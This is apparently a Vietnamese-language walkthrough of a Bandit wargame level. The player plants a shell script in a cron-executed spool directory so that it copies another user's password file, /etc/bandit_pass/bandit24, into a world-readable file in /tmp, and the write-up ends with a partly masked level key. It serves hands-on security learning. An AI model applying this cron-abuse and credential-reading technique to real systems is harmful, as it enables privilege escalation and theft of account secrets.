# Write-up

## Đề cho
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Solve
B1 tạo script trong /tmp/
``` bash
nano script.sh
```
Nhập nội dung sau:
``` bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/123
chmod 644 /tmp/123
```
B2: cấp quyền chạy
```bash
chmod +x /tmp/script.sh
```
B3: chuyển file script này qua `/var/spool/bandit24/foo/` để cronjob mỗi phút chạy 1 lần
```bash
cp /tmp/script.sh /var/spool/bandit24/foo/
```
B4: đợi ~1p rồi ta sẽ lấy kq ở 
```bash
cat /tmp/123
```
## Key
`hVQMk3lJNsmQ7VF3ubyrNNBom7******`